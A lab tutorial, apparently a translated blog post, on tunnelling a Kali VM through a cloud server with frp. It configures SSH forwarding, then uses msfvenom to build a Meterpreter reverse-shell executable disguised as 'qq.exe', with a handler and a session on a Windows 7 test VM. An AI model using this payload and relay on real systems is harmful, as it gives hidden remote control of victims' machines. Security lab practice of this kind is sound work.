---
title: Setting Up a Remote Metasploit Lab with frp
translation_id: frp-lab
source_digest: c6cf273f56130eb7dce157e8acd1d0ce525da5559246cfa536d003acdd4c3ef0
tags:
  - frp
  - Metasploit
  - Network Penetration
categories:
  - Cybersecurity
  - Security Labs
sections: {"preparation": "准备", "frps-cloud-server": "frps云服务器", "download-and-install": "下载安装", "configure-frps": "编写-frps-配置文件", "run": "运行", "frpc-kali-virtual-machine": "frpckali-虚拟机", "download-and-install-2": "下载安装-2", "configure-frpc": "编写-frpc-配置文件", "run-2": "运行-2", "ssh-connection-test": "ssh-连接测试", "metasploit-lab-test": "msf-渗透攻击测试", "additional-frpc-configuration": "frpc-添加新配置", "test-payload-generation": "msf-生成木马", "session-listener": "msf-监听反弹的-shell"}
---

I configured frp between a cloud server and a Kali VM. I tested the connection with SSH first, then used the tunnel in the Metasploit lab.
<!-- more -->

:::info
I used frp 0.41.0, an Ubuntu 18.04.6 cloud server and a Kali Linux 2022 VM. The configuration examples use the INI format from that release. For a different release, check its own documentation.
:::

## Preparation

The server running frps needs a public IP address. The machine running frpc needs outbound network access. In this setup:

- **frps:** Ubuntu 18.04.6 cloud server.
- **frpc:** Kali Linux 2022 guest.
- **Project:** [fatedier/frp](https://github.com/fatedier/frp).

## frps (cloud server)

### Download and install

I downloaded the Linux amd64 package from the [0.41.0 release](https://github.com/fatedier/frp/releases/tag/v0.41.0). The screenshots show that version.

![Linux amd64 package on the frp 0.41.0 release page](https://res.cloudinary.com/sycamore/image/upload/v1792696669/Typora/2026/08/65c0edabf7c4cf7b431c9f10ff94bc05.png)

1. Download the archive in a terminal on the cloud server:

```bash
wget https://github.com/fatedier/frp/releases/download/v0.41.0/frp_0.41.0_linux_amd64.tar.gz
```

![Downloading frp on the Ubuntu cloud server](https://res.cloudinary.com/sycamore/image/upload/v1792696670/Typora/2026/08/d8b546285137f60d42fef4a27a06d821.png)

2. Extract it:

```bash
tar -zxvf frp_0.41.0_linux_amd64.tar.gz
```

![Extracting the frp archive](https://res.cloudinary.com/sycamore/image/upload/v1792696672/Typora/2026/08/4063a698f14734b0fb54a92974122ba5.png)

3. Change into the extracted directory with `cd frp_0.41.0_linux_amd64/`.

The archive includes both frps and frpc. In the screenshot I removed the client files from the server directory. That was just housekeeping; leaving them there does not prevent frps from running.

![Server files left in the extracted directory](https://res.cloudinary.com/sycamore/image/upload/v1792696672/Typora/2026/08/f776553aeca109b5eef6a7e0d3d6bacd.png)

### Configure frps

The server needs a listening port for the client. I also enabled the optional dashboard to see the connection status. Omit the dashboard settings if you don’t need it.

Run `vim frps.ini` and enter the server settings:

```ini
[common]
bind_port = 7777
dashboard_port = 9999
dashboard_user = Sycamore
dashboard_pwd = 123456
```

The client connects to `bind_port`. The separate dashboard port serves the monitoring page; its username and password apply to that page.

![Connection port and dashboard settings in frps.ini](https://res.cloudinary.com/sycamore/image/upload/v1792696678/Typora/2026/08/02f8cca9459920e2f031c95fec4c172e.png)

The screenshot shows the weak lab password `123456`. Use your own credentials for an actual deployment.

In this example, frpc connects to port 7777 and the dashboard listens on port 9999. Check the cloud security group and host firewall for those ports. Restrict dashboard access to the machines that need it.

### Run

From the extracted directory, run `./frps -c frps.ini` to keep the server in the foreground.

> Closing the terminal or interrupting the foreground command can stop the process.

For a background process I used:

```bash
nohup ./frps -c frps.ini >/dev/null 2>&1 &
```

This discards output and does not arrange startup after a reboot. I ran the server in the background and managed the client with systemd.

## frpc (Kali Virtual Machine)

The remaining client installation, configuration and startup steps take place inside Kali.

![Kali Linux VM used in the lab](https://res.cloudinary.com/sycamore/image/upload/v1792696674/Typora/2026/08/692976286e5ddec8cd744326a1c3a54d.png)

### Download and install

Download and extract the same release and enter its directory. The client uses frpc and frpc.ini. There is no need to remove the server files.

### Configure frpc

The client needs the server address and a description of the service to forward. I used SSH to test connectivity. The section name is my choice; SSH is not a prerequisite for frp.

Run `vim frpc.ini` and enter the client settings:

```ini
[common]
server_addr = 106.15.52.194
server_port = 7777

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 6666
use_compression = true
```

The IP is the cloud server address from my lab. The client’s server_port corresponds to the server’s bind_port. The SSH mapping exposes the guest’s local SSH service on port 6666 of the cloud server.

![Annotated SSH forwarding settings in frpc.ini](https://res.cloudinary.com/sycamore/image/upload/v1792696682/Typora/2026/08/2144e375ff1aca162bb41868d050259f.png)

The screenshot also includes the later `[msf]` mapping. Only the `[common]` and `[ssh]` sections apply to this test.

### Run

Run `./frpc -c frpc.ini` in the program directory for foreground operation. To start it on boot, use a systemd unit.

My executable and configuration lived in /root/frp/. The paths in the unit must point to their actual locations.

This was my /lib/systemd/system/frp.service:

```ini
[Unit]
Description=Frp Client Service
After=network.target remote-fs.target nss-lookup.target
Wants=network.target

[Service]
Type=simple
ExecStart=/root/frp/frpc -c /root/frp/frpc.ini
Restart=always
RestartSec=20s

[Install]
WantedBy=multi-user.target
```

![Annotated systemd unit for frpc](https://res.cloudinary.com/sycamore/image/upload/v1792696677/Typora/2026/08/frp-systemd-annotation.png)

I used the following commands. The service name frp corresponds to the filename frp.service.

- Start: `systemctl start frp`.
- Enable on boot: `systemctl enable frp`.
- Restart: `systemctl restart frp`.
- Stop: `systemctl stop frp`.
- Inspect status and recent logs: `systemctl status frp`.

## SSH Connection Test

With the service running, test SSH through the mapped port on the cloud host. In `ssh root@x.x.x.x -p 6666`, substitute the cloud server’s public address.

The cloud server is the connection entry point, but the forwarded login is to the Kali guest. Use the guest’s SSH account. Its system information appears after login.

![SSH connection to Kali through the forwarded port](https://res.cloudinary.com/sycamore/image/upload/v1792696681/Typora/2026/08/52501488b9125c9518e2190783a8fcf4.png)

For Xshell, create a session using the cloud address and mapped port:

![Cloud server address and forwarded port in Xshell](https://res.cloudinary.com/sycamore/image/upload/v1792696687/Typora/2026/08/frp-xshell-port-annotation.png)

Supply the Kali account credentials:

![Kali login credentials in Xshell](https://res.cloudinary.com/sycamore/image/upload/v1792696687/Typora/2026/08/frp-xshell-login-annotation.png)

Save and connect to reach the Kali terminal:

![Xshell connected to Kali](https://res.cloudinary.com/sycamore/image/upload/v1792696686/Typora/2026/08/7eed7e40069de144ddcfb74725077325.png)

## Metasploit lab test

Once SSH was working, I recorded the port settings and screenshots for the Metasploit experiment. I used Kali with a Windows 7 x64 guest as the target.

### Additional frpc configuration

I added the following settings at the end of `frpc.ini`:

```ini
[msf]
type = tcp
local_ip = 127.0.0.1
local_port = 4444
remote_port = 2333
```

![New msf forwarding rule in frpc.ini](https://res.cloudinary.com/sycamore/image/upload/v1792696686/Typora/2026/08/75402a4aa7e5b6970ffb51313c0a847f.png)

### Test payload generation

The incoming connection went through the cloud server, so LHOST and LPORT in my notes refer to its address and mapped port. Here’s the generation command:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=2333 -f exe > qq.exe
```

![Generating qq.exe in the terminal](https://res.cloudinary.com/sycamore/image/upload/v1792696690/Typora/2026/08/f72e4363a982738b25b5976722ab8948.png)

### Session listener

I kept frps and frpc running and transferred the test file to the Windows 7 x64 guest. This screenshot shows the download from Kali’s Apache2 server:

![Downloading the test file from the internal web page on Windows 7](https://res.cloudinary.com/sycamore/image/upload/v1792696692/Typora/2026/08/79c8bcdd330dc38041cee9fa333d9bb8.png)

On the listener side I used the following commands:

1. `msfconsole` opens Metasploit.
2. `use exploit/multi/handler` selects the handler.
3. `set PAYLOAD windows/x64/meterpreter/reverse_tcp` selects the payload.
4. `set LHOST 127.0.0.1` sets the listening address.
5. `set LPORT 4444` sets the local listening port.
6. `run` starts the listener.

> **Start the listener before running the test file.**

Here’s the file running on Windows 7:

![Running the test file on the Windows 7 VM](https://res.cloudinary.com/sycamore/image/upload/v1792696694/Typora/2026/08/553d087d53826c0f6f0bc2edf848b2b0.png)

On the listener side I saw a Meterpreter session and a listing of the desktop files:

![Meterpreter session on the listening host](https://res.cloudinary.com/sycamore/image/upload/v1792696695/Typora/2026/08/204ea56873200eb9b2507252955adb2a.png)
